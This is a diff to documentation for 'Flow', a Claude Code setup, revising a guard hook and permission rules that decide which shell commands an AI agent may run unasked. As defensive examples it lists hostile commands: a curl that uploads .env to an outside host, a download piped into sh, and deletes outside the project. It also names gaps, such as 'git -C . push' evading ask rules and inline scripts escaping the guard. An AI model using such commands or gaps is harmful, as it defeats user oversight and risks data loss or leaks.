@@ -50,14 +50,32 @@ Settings load at startup. **Restart Claude Code after any change.**
 
 Runs `scripts/guard.js` before every Bash call. The script reads the pending command on stdin, and answers `ask` or nothing.
 
-**The guard asks about 4 things a permission pattern cannot see.** A pattern such as `Bash(rm *)` matches the start of a command. These 4 dangers sit further in:
+**The guard is what stands between Claude and a dangerous command.** [`allow`](#allow) lets every shell command through, so a command runs unasked unless the guard, an [`ask` rule](#ask-6-commands-that-always-ask) or Claude Code's own checks stop it. A danger the guard does not know runs. [Why every shell command is allowed](#why-every-shell-command-is-allowed) covers that trade.
 
-- **A recursive or forced delete outside the working directory**: `rm -rf ../other-project`. A delete inside it passes
-- **A download piped into a shell**: `curl -fsSL https://example.com/install.sh | sh`
-- **A write into a shell startup file**: `echo 'export PATH=…' >> ~/.bashrc`
-- **A git command that throws work away**: a force push, `reset --hard`, `clean`, `rebase`, `filter-branch`, `branch -D`, a tag or ref delete, `reflog delete` or `expire`, `gc --prune`, `worktree remove --force`
+**The guard reads a command the way bash splits it.** A permission pattern such as `Bash(rm *)` matches the start of a command. The guard reads the whole of it. Loops, pipes, `$(…)`, backticks, here-docs, `bash -c '…'`, `eval` and `xargs` each reach its checks as a separate command. It peels wrappers such as `sudo`, `env`, `timeout` and `nohup` down to the program they run. It follows a `cd`, and a variable set earlier in the same command. A new shape of command needs no change to the guard. A new tool joins a kind of harm with one entry in a list inside the script.
 
-Each one asks every time, even where an allow rule matches, such as a `Bash(git push *)` you saved. The guard never answers `allow`. Anything it stays silent on goes to Claude Code's own rules, so a bug in the guard can never let through more than the settings do.
+**It asks before 5 kinds of harm:**
+
+1. **Losing work on this machine.** A delete outside the project: `rm -rf ../other-project`. A delete of work git has no copy of: a changed file, a new file, or a file git ignores, such as `.env`. The git commands that throw work away: a force push, `reset --hard`, `clean`, `rebase`, `branch -D`, `stash drop`, and a `checkout` or `restore` over uncommitted changes.
+2. **Sending data off the machine.** `curl` or `wget` sending data, such as `curl -d @.env https://example.com`. A copy to another host with `scp` or `rsync`. Every `ssh`.
+3. **Touching shared systems.** 21 deploy and cloud tools, `kubectl`, `terraform`, `aws`, `gh` and `vercel` among them, whenever the command does more than read. A database wipe: `DROP TABLE`, `TRUNCATE`, `dropdb`, `prisma migrate reset`.
+4. **Changing the machine outside the project.** A global install, such as `npm install -g` or a `pip install` outside a virtual environment. `crontab`, `systemctl`, `pkill`. A write into `~/.ssh`, a shell startup file such as `~/.bashrc`, or `~/.gitconfig`.
+5. **Running outside code, or switching Flow off.** A download run straight away: `curl -fsSL https://example.com/install.sh | sh`. An `npx` of a package the project does not have. A write into `~/.claude`, `~/.flow`, `~/.agents` or the project's `.claude/settings.json`, where the guard itself is switched on.
+
+**Inside the project, a delete asks only when nothing can bring the files back.** The guard asks `git status` which files under the target are changed, staged, new or ignored. None → the delete runs, since a committed file comes back with `git checkout`. An ignored file asks too, unless it sits in a folder a build or an install makes again: `node_modules/`, `dist/`, `build/`, `.next/`, a cache or a virtual environment. `tmp/` is left off that list on purpose, since scratch work there has no other copy. Outside git, the same list decides. 4 more calls:
+
+- **Every delete outside the project asks**, with or without `-r` or `-f`, `/tmp` included.
+- **A loop over plain words is read word by word.** `for f in notes.md; do rm "$f"; done` asks about `notes.md` by name. A loop over `$(…)` asks, since its words are only known when it runs.
+- **A `find` that deletes runs first without deleting**, to list what would match, and the guard checks exactly those files. A listing that takes over 3 seconds asks.
+- **A plain commit or push is left to the [`ask` rules](#ask-6-commands-that-always-ask).** Delete one of those rules and that command runs unasked.
+
+**Where it cannot tell, it asks only when the unknown part decides a loss.** `rm -rf "$DIR"`, with `DIR` set somewhere the guard cannot see, asks. So does a program named by a variable, and anything fed to `xargs rm`. Anything else it cannot read stays silent. So does a command bash itself would refuse, such as one with an unclosed quote. A crash inside the guard asks when the command names a program such as `rm`, `git`, `curl` or `ssh`.
+
+**It cannot see inside a script.** `node -e`, `python3 -c`, or a file Claude wrote and then runs, can do anything unasked. The guard catches the forms Claude writes at the prompt, and is no wall.
+
+**Each prompt carries one line from the guard**, saying what the command does and why that matters: `Deletes notes.md, a new file git has no copy of`, or `Sends data to example.com`. The rest of the prompt is Claude Code's own and cannot be changed: a header saying a hook asked, a hint about settings, and Yes or No.
+
+**The guard never answers `allow`.** Anything it stays silent on goes to Claude Code's own rules, so a bug in the guard can never let through more than the settings do.
 
 Node, not Python. The hook inherits Claude Code's `PATH`, so a Node installed under nvm has to be on it, but `flow` and `util` are Node too, so that is already a hard requirement of the toolchain and this adds nothing new. What it removes is a third language in a five-file folder.
 
@@ -296,28 +314,61 @@ Rules evaluate **deny → ask → allow**, first match wins. A broad deny beats 
 | `Read` | every file read, in any folder |
 | `WebFetch` | every domain |
 | `WebSearch` | every search |
-| `Bash(mkdir *)`, `Bash(touch *)`, `Bash(mv *)`, `Bash(cp *)`, `Bash(rm *)`, `Bash(ln *)`, `Bash(chmod *)` | making, moving, copying, linking and deleting files, and changing a file's permissions |
-| `Bash(node *)`, `Bash(python3 *)`, `Bash(bash *)`, `Bash(sh *)` | running a script: Flow's, one bundled in any skill, or the project's own |
-| `Bash(grep *)`, `Bash(awk *)`, `Bash(sed *)`, `Bash(perl *)`, `Bash(echo *)` | searching, slicing and printing text. `grep` alone already runs unasked, until a pattern holds `\|` or a backtick: Claude Code then asks, and saves the whole command word for word |
-| `Bash(flow *)`, `Bash(fw *)`, `Bash(util *)` | Flow's own commands |
-| `Bash(npm test *)`, `Bash(npm run *)`, and the same 2 for `pnpm`, `yarn` and `bun` | a project's tests and scripts |
-| `Bash(pytest *)`, `Bash(cargo test *)`, `Bash(go test *)` | tests in Python, Rust and Go |
+| `Bash` | every shell command, with loops, variables, `$(…)` and pipes included |
 
-A tool name written **without parentheses matches every use of that tool**. A pattern ending in ` *` matches the command with anything after it, or with nothing: `Bash(npm test *)` covers `npm test` and `npm test -- --watch`, and never `npm testing`.
+A tool name written **without parentheses matches every use of that tool**.
 
-**A shell command no entry matches asks you.** `git commit`, `npm install` and `curl` all stop for a yes. Claude Code's own read-only set runs with no rule: `ls`, `cat`, `head`, `tail`, `grep`, `find`, `wc`, `diff`, and git's reads such as `git status`, `git log` and `git diff`.
+**A shell command asks you in 5 cases only:**
 
-**"Yes, don't ask again" saves a pattern, into the project.** Approving `npm view left-pad version` offers `Bash(npm view *)`, which lands in `.claude/settings.local.json` at the repository root. The next `npm view` in that project runs with no prompt. A chained command saves one rule per piece, and a piece Claude Code cannot shorten into a pattern is saved word for word: `curl -sI https://example.com` stays whole.
-
-**Why a shipped list rather than every shell command.** Until 2026-09-25 this list held a bare `Bash`, and the guard held a list of dangerous commands to catch. A list of dangers is only ever as complete as whoever last edited it, and whatever it missed ran with no question. A list of routine commands fails the other way: whatever it misses asks you once, and one "don't ask again" covers it in that project from then on.
-
-**Git has no entry, so every git write asks.** A commit, a push, a merge: each stops for a yes. Save `Bash(git commit *)` from the prompt and commits run freely in that project. The guard's destructive-git ask still holds after that, since it reads the flags a pattern cannot.
+- **The guard asks**, before one of its [5 kinds of harm](#hooks)
+- **An [`ask` rule](#ask-6-commands-that-always-ask) matches**: a commit, a push or a publish
+- **A redirect or a `tee` writes outside the working directory**, or to a target starting with `~` or holding a glob. Claude Code checks a write's target as if Claude edited that file, whatever the allow list says
+- **A write lands in a protected path**: `.git`, `.claude`, `.vscode`, `.idea`, `.husky` and friends. No allow rule can pre-approve one
+- **An `rm` aims at a critical path**, such as `/` or your home folder. No rule and no hook can approve one
 
 **`Read` is blanket.** Without it, a read outside the project asks you. Approving one read saves a rule for that one folder, and the next folder asks again.
 
-Still prompts: writes into protected paths (`.git`, `.claude`, `.vscode`, `.idea`, `.husky` and friends), which allow rules cannot pre-approve by design.
-
 **Spawning a subagent never prompts, so `Agent` needs no entry.** Claude Code checks a subagent's own tool calls against these same rules while it works, and that is what governs a worker.
+
+#### Why every shell command is allowed
+
+Decided by the user 2026-09-28, after 2 designs that listed safe commands failed in real sessions.
+
+**A list of safe programs failed on the shape of a command.** From 2026-09-25, `allow` named each routine program: `Bash(node *)`, `Bash(grep *)`, `Bash(npm test *)` and so on. Claude Code asks about a command holding a loop, a variable or a `$(…)` even when every program in it is on the list, and no rule can match that. This loop asked, although `echo` was on the list and `wc` only reads:
+
+```sh
+for f in docs/*.md; do echo "$f"; wc -l "$f"; done
+```
+
+"Yes, don't ask again" saves a command like that word for word, so the next loop asks again.
+
+**A hook that approved safe shapes failed the same way.** `approve.js`, built and removed on 2026-09-28, read the whole command and allowed it when every program in it was on the list. Claude writes shell in endless shapes, and every shape the hook had not been written for asked again. Its first live session hit one within minutes: `wc -l < "$f"` inside a loop. Each miss meant editing the script.
+
+**Allowing everything moves the gaps to where they are rare.** Safe shapes are endless and change every day. The kinds of danger are few and change slowly: losing work, sending data off the machine, touching a shared system, changing the machine, running outside code, and a commit, a push or a publish. The guard and the `ask` rules name those.
+
+**The cost is a danger nothing names, which now runs without asking.** Before, a gap cost one extra question. Now it costs a command you never saw. A deploy tool missing from the guard's list runs unasked until you add an `ask` rule for it, and so does a script Claude writes and then runs. The old list already allowed `Bash(node *)`, `Bash(python3 *)` and `Bash(bash *)`, and any of those runs a script that can do anything, so its questions never covered much.
+
+**2 other ways to stop the prompts were rejected:**
+
+- **Auto mode**, where a second model judges each call. [Modes](#modes) gives the 4 reasons.
+- **Claude Code's sandbox**, a wall the operating system puts around every shell command, which then runs unasked inside it. It needs bubblewrap and socat on Linux and WSL, and never runs on Windows outside WSL. Inside it docker, dev containers, jest's file watcher and package caches outside the project break, and Claude Code's own settings files cannot be written. A command that fails inside the wall is retried outside it, and the retry asks.
+
+#### `ask`: 6 commands that always ask
+
+```json
+"ask": ["Bash(git commit *)", "Bash(git push *)", "Bash(npm publish *)",
+        "Bash(pnpm publish *)", "Bash(yarn publish *)", "Bash(cargo publish *)"]
+```
+
+**Each one puts work where other people see it.** A commit becomes history others pull, a push sends it to the remote, and a publish puts a package in front of everyone who installs it.
+
+A pattern ending in ` *` matches the command with anything after it, or with nothing: `Bash(git push *)` covers `git push` and `git push origin main`, and never `git pushx`.
+
+**Claude Code finds them anywhere in a command**, inside a loop, a `$(…)` or after a `cd`. It misses another spelling of the same command: `git -C . push` and `bash -c 'git push'` run unasked.
+
+**An `ask` rule beats every allow rule, a saved "don't ask again" included.** Commits ask every time, however often you approve one. To let them run, delete `"Bash(git commit *)"` from the `ask` list in `~/.claude/settings.json`. To add a command, add a line in the same shape, such as `"Bash(make deploy *)"`.
+
+**Every other git write runs unasked**: a merge, a new branch, a stash, a checkout. The guard still asks before the ones that throw work away, since it reads the flags a pattern cannot.
 
 #### `deny`: Claude Code surfaces Flow doesn't use
 
@@ -373,10 +424,6 @@ This is the 4th of 4 locks, and the weakest: a prefix rule cannot name every way
 
 `flow restore ls` is left allowed. It prints what has been recorded and changes nothing.
 
-#### No `ask` rules
-
-**Flow ships no `ask` rule, because an `ask` rule beats every allow rule, a saved one included.** `"ask": ["Bash(git push *)"]` would prompt on every push forever, however many times you chose "don't ask again". Whatever needs a question every time lives in `guard.js` instead, which asks about the dangerous form alone.
-
 #### Modes
 
 ```json
@@ -385,21 +432,22 @@ This is the 4th of 4 locks, and the weakest: a prefix rule cannot name every way
 
 Six of them, cycled with Shift+Tab and overridable for one session with `--permission-mode <name>`. A mode only decides what happens to a call no rule above matched.
 
-**Every session starts in `default`, labelled Manual.** The allow list covers everything routine, so the prompts left over are the ones worth seeing. The key has to be there. Since Claude Code 2.1.228, a terminal session on a Pro, Max or Team plan starts in `auto` unless a settings file names another mode. `flow doctor` fails when the key is missing, and prints a note when it names another mode.
+**Every session starts in `default`, labelled Manual.** Every shell command is allowed, so the only prompts left are the 5 cases under [`allow`](#allow). The key has to be there. Since Claude Code 2.1.228, a terminal session on a Pro, Max or Team plan starts in `auto` unless a settings file names another mode. `flow doctor` fails when the key is missing, and prints a note when it names another mode.
 
-**`auto` is not where a session starts.** In auto mode a second model, the classifier, reviews a call before it runs and blocks what looks beyond your request. 3 things decided against it:
+**`auto` is not where a session starts, and not how Flow stops the prompts.** In auto mode a second model, the classifier, reviews a call before it runs and blocks what looks beyond your request. Ruled out by the user 2026-09-28, for 4 reasons:
 
-- **It pulls against Flow's first rule.** Anthropic's permission modes page says auto mode nudges the model to "keep working without stopping for clarifying questions". `instruction-or-thinking` in `home/AGENTS.md` says a message that is not an instruction gets a reply and no edit.
-- **It reviews most shell commands.** Entering auto mode drops the allow entries that can run any code, such as `Bash(node *)`, `Bash(python3 *)` and `Bash(npm run *)`, so those commands go to the classifier. Reads, edits inside the project and the narrower allow entries skip it.
-- **Its cost on a subscription is unconfirmed.** The same page says classifier calls count toward usage on Enterprise plans and API accounts, and says nothing about Pro or Max.
+- **It costs extra.** Every call it reviews is judged by a second model. Anthropic's permission modes page says those calls count toward usage on Enterprise plans and API accounts.
+- **Its review fails on its own.** When the check reaches no verdict, Claude Code blocks the call, with a message that auto mode "cannot determine the safety" of it or that the server returned no safety verdict. Flow sessions have hit both.
+- **It blocks what you already agreed to.** The classifier judges the command, and misses the conversation that led to it. An edit to a settings file or a delete that you approved a message earlier gets blocked as destructive, or as Claude changing its own setup. It refused Flow's own `~/.flow/run.json` that way. Every block costs you a question anyway.
+- **It pulls against Flow's first rule.** The same page says auto mode nudges the model to "keep working without stopping for clarifying questions". `instruction-or-thinking` in `home/AGENTS.md` says a message that is not an instruction gets a reply and no edit.
 
-**The guard works in either mode.** A hook's `ask` still forces a prompt in auto mode. The classifier can add a block and never remove one.
+**Entering auto mode also sets the bare `Bash` rule aside**, as it does every allow rule that can run any code. Every shell command then waits for the classifier.
 
-**In auto mode a git commit can run with no prompt**, when the classifier judges it part of your request. The guard's destructive-git ask still holds there.
+**The guard and the `ask` rules work in either mode.** Both still force a prompt in auto mode. The classifier can add a block and never remove one.
 
-**`auto` and `dontAsk` are the 2 unattended modes.** Reach for either with Shift+Tab, never by setting it here. `auto` lets the classifier approve what the allow list does not cover, and catches what the guard never looks for, such as a command sending data off the machine. `dontAsk` denies whatever the allow list does not cover, with no second model, so a long run finishes and every denial shows up in the transcript.
+**`auto` and `dontAsk` are the 2 unattended modes.** Reach for either with Shift+Tab, never by setting it here. `auto` catches what the guard never looks for, such as a script Claude wrote and then runs. `dontAsk` denies whatever would have asked you, with no second model, so a long run finishes and every denial shows up in the transcript.
 
-**`acceptEdits` buys almost nothing.** It lets edits through, and `mkdir`, `touch`, `rm`, `mv`, `cp` and `sed` inside the project. The allow list above already covers all of them but `sed`.
+**`acceptEdits` buys nothing.** It lets edits and a few file commands through, and the allow list already covers every edit and every shell command.
 
 **`bypassPermissions` is locked out**, by `permissions.disableBypassPermissionsMode: "disable"`. Its one addition over `acceptEdits` is silent writes into `.claude` and `.git`, and Flow's settings, subagents and links all sit in `.claude`. The same key disables the `--dangerously-skip-permissions` flag, which the deny list above also blocks as a shell command, and makes Claude Code ignore `permissionMode: bypassPermissions` in any agent definition.
 
@@ -486,7 +534,7 @@ Claude Code can skip the script without a warning and use its own list: in a fol
 
 **The built-in task tools** (`TaskCreate`, `TaskGet`, `TaskList`, `TaskUpdate`) stay allowed rather than joining the deny list. They look like a tracker competing with `flow` and are not: `flow` records work that outlives the session, these are a scratch checklist for the turn in front of you. Denying them costs the checklist and saves nothing.
 
-**`sandbox`.** Claude Code's bubblewrap jail was considered and rejected. It is a genuine OS-level boundary at zero token cost, and it remains the right answer for unattended runs, but it needs `socat` installed, blocks Windows binaries under WSL2, and adds a second boundary to reason about.
+**`sandbox`.** Claude Code's wall around shell commands was considered and rejected. [Why every shell command is allowed](#why-every-shell-command-is-allowed) gives the reasons. It remains the right answer for an unattended run.
 
 ## Flow's settings files
 
